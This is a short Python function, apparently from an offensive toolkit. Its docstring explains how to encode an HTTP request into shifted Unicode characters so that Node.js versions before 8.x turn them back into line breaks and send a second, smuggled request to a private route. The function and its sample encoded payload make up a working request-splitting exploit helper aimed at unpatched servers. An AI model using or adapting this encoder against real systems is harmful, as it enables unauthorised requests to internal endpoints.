def conceal_payload(payload_raw: str) -> str:
    """
    Converts plain payload to payload of non-ascii symbols,
    which helps to jump over escape characters checks and
    smuggle some requests.

    Example:
    raw payload in a form of:
    ________________________________________
    x HTTP/1.1

    POST /private_route HTTP/1.1


    ________________________________________

    is converted to:
    ________________________________________
    ݸܠ݈ݔݔݐܯܱܮܱ܊܊ݐݏݓݔܠܯݰݲݩݶݡݴݥݟݲݯݵݴݥܠ݈ݔݔݐܯܱܮܱ܊܊
    ________________________________________

    After payload is smuggled as a parameter to the server,
    Node < 8.x will not check for escape characters, and
    convert the payload to latin1 before sending the request.

    http module will think that it needs to send one more request
    and will send it to the server from the same server.

    To check how an old Node.js server handles this payload,
    you can use the following js command:

    Buffer.from(payload.toLowerCase(), 'latin1').toString()
    """
    return ''.join(chr(ord(symbol) + 0x700) for symbol in payload_raw)
